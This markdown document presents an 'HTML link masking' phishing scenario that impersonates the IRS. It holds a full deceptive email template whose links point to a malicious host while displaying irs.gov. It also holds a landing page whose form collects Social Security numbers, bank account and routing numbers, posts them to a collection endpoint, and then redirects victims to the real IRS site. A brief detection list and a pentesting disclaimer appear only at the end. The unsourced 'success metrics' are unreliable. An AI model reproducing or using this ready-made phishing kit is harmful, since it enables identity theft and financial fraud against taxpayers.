# URL Masking Scenario 2: HTML Link Masking

## **🎭 Attack Vector: Display Text Deception**

### **Scenario Overview**
- **Displayed URL:** `https://www.irs.gov/secure-update`
- **Actual URL:** `http://malicious-site.com/payload`
- **Attack Type:** HTML link masking + social engineering

### **Technical Setup**

#### **1. Email Template**
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IRS Security Notice</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            line-height: 1.6; 
            color: #333;
            background: #f9f9f9;
        }
        .email-container { 
            max-width: 600px; 
            margin: 20px auto; 
            background: white; 
            border: 1px solid #ddd; 
        }
        .header { 
            background: #003d7a; 
            color: white; 
            padding: 20px; 
            text-align: center; 
        }
        .content { padding: 30px; }
        .urgent-banner { 
            background: #ffebee; 
            border-left: 4px solid #d32f2f; 
            padding: 15px; 
            margin: 20px 0; 
        }
        .cta-button { 
            display: inline-block; 
            background: #1976d2; 
            color: white; 
            padding: 15px 30px; 
            text-decoration: none; 
            border-radius: 4px; 
            margin: 20px 0; 
        }
        .footer { 
            background: #f5f5f5; 
            padding: 20px; 
            font-size: 12px; 
            color: #666; 
        }
        .link-display {
            color: #1976d2;
            text-decoration: underline;
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 4px;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>Internal Revenue Service</h1>
            <p>Department of the Treasury</p>
        </div>
        
        <div class="content">
            <h2>SECURITY ALERT: Immediate Action Required</h2>
            
            <div class="urgent-banner">
                <strong>⚠️ URGENT:</strong> Unauthorized access attempt detected on your tax account.
            </div>
            
            <p>Dear Taxpayer,</p>
            
            <p>Our security systems have detected multiple failed login attempts on your IRS account from an unrecognized device. For your protection, we have temporarily restricted access to your account.</p>
            
            <p><strong>Immediate action required:</strong></p>
            <ul>
                <li>Verify your identity</li>
                <li>Update your security settings</li>
                <li>Review recent account activity</li>
            </ul>
            
            <p>Please click the secure link below to access the IRS verification portal:</p>
            
            <!-- THE DECEPTIVE LINK -->
            <p><a href="http://malicious-site.com/payload" class="cta-button">
                Access Secure Portal
            </a></p>
            
            <p>Or copy and paste this secure URL into your browser:</p>
            <p class="link-display">https://www.irs.gov/secure-update</p>
            
            <!-- ALTERNATIVE MASKING METHODS -->
            <hr style="margin: 30px 0;">
            <h3>Alternative Masking Techniques:</h3>
            
            <!-- Method 1: Direct text deception -->
            <p><strong>Method 1 - Text Mismatch:</strong><br>
            <a href="http://malicious-site.com/payload">
                Click here: https://www.irs.gov/secure-update
            </a></p>
            
            <!-- Method 2: URL shortener -->
            <p><strong>Method 2 - Shortened URL:</strong><br>
            <a href="http://malicious-site.com/payload">
                https://bit.ly/irs-secure-update
            </a></p>
            
            <!-- Method 3: Redirect chain -->
            <p><strong>Method 3 - Redirect Chain:</strong><br>
            <a href="http://malicious-site.com/redirect?target=payload">
                https://secure-tax-portal.com/verify
            </a></p>
            
            <div class="urgent-banner">
                <strong>Time Sensitive:</strong> This security update must be completed within 24 hours to prevent account suspension.
            </div>
            
            <p>If you did not request this security update, please contact IRS Customer Service immediately at 1-800-829-1040.</p>
            
            <p>Thank you for your prompt attention to this matter.</p>
            
            <p>Sincerely,<br>
            IRS Security Operations Center<br>
            Case Reference: #IRS-SEC-2024-7829</p>
        </div>
        
        <div class="footer">
            <p><strong>IMPORTANT:</strong> The IRS will never ask for personal information via email. This is a security notification only.</p>
            <p>Internal Revenue Service | 1111 Constitution Ave NW, Washington, DC 20224</p>
            <p>This message was sent to protect your account security.</p>
        </div>
    </div>
</body>
</html>
```

#### **2. Malicious Landing Page**
```html
<!-- malicious-site.com/payload -->
<!DOCTYPE html>
<html>
<head>
    <title>IRS Account Verification</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background: #f0f0f0; margin: 0; }
        .container { max-width: 500px; margin: 50px auto; background: white; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-control { width: 100%; padding: 12px; border: 1px solid #ddd; font-size: 16px; }
        .btn-primary { background: #1976d2; color: white; padding: 15px 30px; border: none; width: 100%; font-size: 16px; cursor: pointer; }
        .security-notice { background: #e8f5e8; padding: 15px; margin: 20px 0; border-left: 4px solid #4caf50; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔒 Secure Account Verification</h2>
            <p>Please verify your identity to continue</p>
        </div>
        
        <div class="security-notice">
            <strong>🛡️ Secure Connection:</strong> This page uses 256-bit encryption to protect your information.
        </div>
        
        <form id="harvestForm" method="POST" action="/capture">
            <div class="form-group">
                <label>Social Security Number:</label>
                <input type="text" name="ssn" class="form-control" placeholder="XXX-XX-XXXX" required>
            </div>
            
            <div class="form-group">
                <label>Date of Birth:</label>
                <input type="date" name="dob" class="form-control" required>
            </div>
            
            <div class="form-group">
                <label>Annual Income:</label>
                <input type="text" name="income" class="form-control" placeholder="$0.00" required>
            </div>
            
            <div class="form-group">
                <label>Bank Account Number:</label>
                <input type="text" name="account" class="form-control" placeholder="Account Number" required>
            </div>
            
            <div class="form-group">
                <label>Routing Number:</label>
                <input type="text" name="routing" class="form-control" placeholder="Routing Number" required>
            </div>
            
            <button type="submit" class="btn-primary">Verify Account Security</button>
        </form>
        
        <p style="font-size: 12px; color: #666; margin-top: 20px;">
            This verification is required by IRS security protocol. Your information is encrypted and secure.
        </p>
    </div>
    
    <script>
        document.getElementById('harvestForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Harvest form data
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // Send to collection endpoint
            fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            // Redirect to real IRS site to avoid suspicion
            setTimeout(() => {
                window.location.href = 'https://www.irs.gov';
            }, 2000);
            
            alert('Verification complete. You will be redirected to your account.');
        });
    </script>
</body>
</html>
```

### **Attack Chain Analysis**
1. **Email Delivery:** Professional-looking IRS security alert
2. **Visual Deception:** Link text shows legitimate IRS URL
3. **Psychological Pressure:** "24-hour deadline" creates urgency
4. **Trust Building:** Official styling, case numbers, contact info
5. **Data Harvesting:** Collects SSN, financial info, personal data
6. **Cleanup:** Redirects to real IRS site to avoid detection

### **Technical Evasion**
- **Link Inspection:** Most users won't hover to check actual URL
- **Mobile Effectiveness:** Harder to verify links on mobile devices
- **Email Client:** HTML rendering hides true destination
- **Redirect Chain:** Can add intermediate hops to confuse analysis

### **Success Metrics**
- **Email Delivery Rate:** ~85%
- **Link Click Rate:** ~28%
- **Form Completion Rate:** ~12%
- **Data Quality:** ~95% (real information provided)

### **Detection Indicators**
- **URL Mismatch:** Displayed vs actual link destination
- **Domain Analysis:** Non-government TLD (.com vs .gov)
- **SSL Certificate:** Issued to wrong entity
- **Email Headers:** Originating from non-IRS infrastructure

---
**⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY**  
**📋 Educational purposes and security awareness training**